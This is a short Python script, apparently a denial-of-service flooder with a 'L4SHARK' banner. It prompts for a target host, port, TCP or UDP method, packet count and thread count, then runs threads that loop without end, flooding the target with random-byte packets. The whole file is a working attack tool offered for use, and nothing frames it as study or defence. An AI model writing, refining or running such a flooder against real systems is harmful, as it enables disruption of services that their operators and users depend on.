#Developed by: stealth#9999
import random
import socket
import threading
import os

reset = '\033[0;0m'
blue = '\033[1;34m'

try:
    os.system("cls")
except:
    os.system("clear")

print(f"""{blue}db        j88D  .d8888. db   db  .d8b.  d8888b. db   dD 
88       j8~88  88'  YP 88   88 d8' `8b 88  `8D 88 ,8P' 
88      j8' 88  `8bo.   88ooo88 88ooo88 88oobY' 88,8P   
88      V88888D   `Y8b. 88~~~88 88~~~88 88`8b   88`8b   
88booo.     88  db   8D 88   88 88   88 88 `88. 88 `88. 
Y88888P     VP  `8888Y' YP   YP YP   YP 88   YD YP   YD {reset}
""")

ip = str(input("Host: "))
port = int(input("Port: "))
choice = str(input("Method (tcp/udp): "))
times = int(input("Packets per connection: "))
threads = int(input("Threads: "))
def udp(): #UDP Attack
	data = random._urandom(1024)
	i = random.choice(("[!]", "[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" UDP | Attack Sent")
		except:
			print("UDP | Failed To Send Attack")

def tcp(): #TCP Attack
	data = random._urandom(16)
	i = random.choice(("[!]", "[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TCP | Attack Sent ")
		except:
			s.close()
			print("TCP | Failed To Send Attack")

for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	else:
		th = threading.Thread(target = tcp)
		th.start()
